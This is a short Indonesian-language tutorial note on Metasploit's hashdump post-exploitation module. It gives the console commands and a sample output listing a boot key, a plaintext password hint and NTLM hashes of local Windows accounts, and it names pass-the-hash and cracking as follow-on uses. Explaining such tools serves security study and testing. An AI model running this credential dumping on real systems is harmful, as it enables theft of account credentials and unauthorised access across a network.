# hashdump

Module `hashdump` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengekstrak `hash password` dari file `SAM` (Security Account Manager) pada komputer target. Modul ini bekerja setelah akses ke sistem berhasil diperoleh (biasanya via meterpreter dengan hak SYSTEM) dan akan membaca isi `SAM` serta `SYSTEM registry hive` untuk memperoleh `hash NTLM` dari akun-akun lokal, sehingga berguna untuk serangan lanjutan seperti pass-the-hash, cracking password, atau akses tidak sah ke akun lain di jaringan.

## Cara Penggunaan di Metasploit

```
use use post/windows/gather/hashdump
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 719ee74fc86782fded26e05e9802b0c9...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

admin:"10101010"

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:afd92ce617b3210a7243ac63c8b3cf98:::
loginbang:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


[*] Post module execution completed
```
